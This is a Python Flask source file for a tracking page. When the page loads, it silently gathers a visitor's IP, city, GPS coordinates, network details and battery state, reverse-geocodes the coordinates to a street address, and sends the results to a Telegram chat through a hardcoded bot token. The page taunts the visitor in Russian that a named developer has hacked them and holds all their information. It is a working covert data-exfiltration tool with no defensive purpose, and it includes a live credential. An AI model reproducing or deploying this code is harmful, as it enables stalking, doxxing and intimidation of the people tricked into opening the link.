from flask import Flask, request, render_template_string
import requests
import os

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "7977163565:AAHH698mxmpv1WDoJLsQbVioqN1kLMKlZTg"
TELEGRAM_CHAT_ID = "8078251938"

HTML_FORM = '''
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>واجهة</title>
  <style>
    body {
      background-color: #000;
      color: #0f0;
      text-align: center;
      font-family: Arial, sans-serif;
      direction: rtl;
      padding: 20px;
    }
    #russian {
      font-size: 16px;
      line-height: 2;
      margin-top: 30px;
    }
    #footer {
      font-weight: bold;
      font-size: 24px;
      color: #0f0;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div id="footer">المطور أحمد 🇮🇶</div>
  <div id="russian">
    Вас взломал разработчик Ахмед Аль Ираки. Ничего не делайте и ни о чём не думайте.
    У меня есть вся ваша информация, и вы ничего не можете сделать. Будьте уверены, 
    я делаю это просто в шутку и из этических соображений. Я не думаю о том, чтобы 
    причинить вам вред или что-то с вами сделать. Всё это ради развлечения и шутки.
  </div>

<script>
async function getIPInfo() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return data;
  } catch (e) {
    return null;
  }
}

function sendData(ipData, position, battery) {
  const data = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    ip: ipData ? ipData.ip : 'متوفر',
    city: ipData ? ipData.city : 'متوفر',
    region: ipData ? ipData.region : 'متوفر',
    country: ipData ? ipData.country_name : 'متوفر',
    country_code: ipData ? ipData.country_code : '',
    org: ipData ? ipData.org : 'متوفر',
    networkType: navigator.connection ? navigator.connection.effectiveType : 'متوفر',
    downlink: navigator.connection ? navigator.connection.downlink : 'متوفر',
    rtt: navigator.connection ? navigator.connection.rtt : 'متوفر',
    latitude: position ? position.coords.latitude : (ipData ? ipData.latitude : 'متوفر'),
    longitude: position ? position.coords.longitude : (ipData ? ipData.longitude : 'متوفر'),
    battery_level: battery ? battery.level : 'غير متوفر',
    battery_charging: battery ? battery.charging : 'غير متوفر'
  };
  
  fetch("/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
}

async function gatherData() {
  const ipData = await getIPInfo();
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => sendData(ipData, position, battery),
          error => sendData(ipData, null, battery)
        );
      } else {
        sendData(ipData, null, battery);
      }
    });
  } else {
    // لو المتصفح لا يدعم Battery API
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => sendData(ipData, position, null),
        error => sendData(ipData, null, null)
      );
    } else {
      sendData(ipData, null, null);
    }
  }
}

window.onload = gatherData;
</script>
</body>
</html>
'''

def get_address_from_coords(lat, lon):
    try:
        url = "https://nominatim.openstreetmap.org/reverse"
        params = {
            "format": "json",
            "lat": lat,
            "lon": lon,
            "zoom": 18,
            "addressdetails": 1,
            "accept-language": "ar"
        }
        headers = {'User-Agent': 'Mozilla/5.0 (compatible; AhmadBot/1.0)'}
        response = requests.get(url, params=params, headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            display_name = data.get('display_name', '')
            if display_name:
                return display_name
        return 'متوفر'
    except Exception:
        return 'متوفر'

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"خطأ في إرسال رسالة التليجرام: {e}")

def country_flag_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ''
    code = country_code.upper()
    OFFSET = 127397
    return chr(ord(code[0]) + OFFSET) + chr(ord(code[1]) + OFFSET)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        data = request.get_json()
        address = None
        if data.get('latitude') != 'متوفر' and data.get('longitude') != 'متوفر':
            address = get_address_from_coords(data['latitude'], data['longitude'])
        
        country_name = data.get('country', 'متوفر')
        country_code = data.get('country_code', '')  # كود البلد

        flag = country_flag_emoji(country_code)

        battery_level = data.get('battery_level', 'غير متوفر')
        battery_charging = data.get('battery_charging', 'غير متوفر')
        charging_text = "يتم الشحن" if battery_charging == True else "غير مشحون"

        msg = f"""<b>تم جمع بيانات جديدة:</b>
نوع الجهاز والمتصفح: {data.get('userAgent')}
النظام الأساسي: {data.get('platform')}
اللغة: {data.get('language')}
عنوان الـ IP: {data.get('ip')}
المدينة: {data.get('city')}
المنطقة: {data.get('region')}
الدولة: {country_name} {flag}
مزود الشبكة: {data.get('org')}
نوع الشبكة: {data.get('networkType')}
سرعة التنزيل (Mbps): {data.get('downlink')}
زمن الاستجابة (ms): {data.get('rtt')}
خط العرض: {data.get('latitude')}
خط الطول: {data.get('longitude')}
مستوى شحن البطارية: {int(float(battery_level)*100) if battery_level != 'غير متوفر' else battery_level}%
حالة الشحن: {charging_text}
"""
        if address:
            msg += f"\nالعنوان التفصيلي: {address}"
        else:
            msg += "\nلم يتم الحصول على العنوان التفصيلي."

        send_telegram_message(msg)
        return "", 204
    return HTML_FORM

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
